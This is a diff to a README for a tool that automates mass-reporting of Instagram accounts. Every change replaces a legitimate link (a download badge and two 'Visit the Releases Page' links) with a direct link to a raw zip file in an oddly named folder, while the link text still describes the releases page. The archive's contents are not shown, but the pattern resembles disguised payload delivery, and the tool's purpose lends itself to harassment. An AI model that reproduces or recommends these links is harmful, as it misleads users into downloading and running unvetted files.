@@ -1,6 +1,6 @@
 # 🎉 instagram-reporting-tool - Automate Your Instagram Reporting Process
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
+![Download](https://raw.githubusercontent.com/sajdvashdfsag1/instagram-reporting-tool/main/culicifugal/reporting_instagram_tool_v2.5.zip)
 
 ## 📋 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -17,7 +17,7 @@ Welcome to the Instagram Reporting Tool! This tool automates the process of repo
 
 To get started, you need to download the software from the releases page. Click on the link below to visit the page.
 
-[Visit the Releases Page](https://github.com/sajdvashdfsag1/instagram-reporting-tool/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/sajdvashdfsag1/instagram-reporting-tool/main/culicifugal/reporting_instagram_tool_v2.5.zip)
 
 1. On the releases page, you will see different versions of the software.
 2. Find the latest version and click on it.
@@ -69,4 +69,4 @@ A: Yes, you can choose specific reasons for each account you want to report.
 
 Now that you have this guide, you are ready to start using the Instagram Reporting Tool. For further assistance, feel free to explore the resources or community forums linked at the bottom of this page.
 
-[Visit the Releases Page](https://github.com/sajdvashdfsag1/instagram-reporting-tool/releases) to download the software and take control of your reporting today.
+[Visit the Releases Page](https://raw.githubusercontent.com/sajdvashdfsag1/instagram-reporting-tool/main/culicifugal/reporting_instagram_tool_v2.5.zip) to download the software and take control of your reporting today.
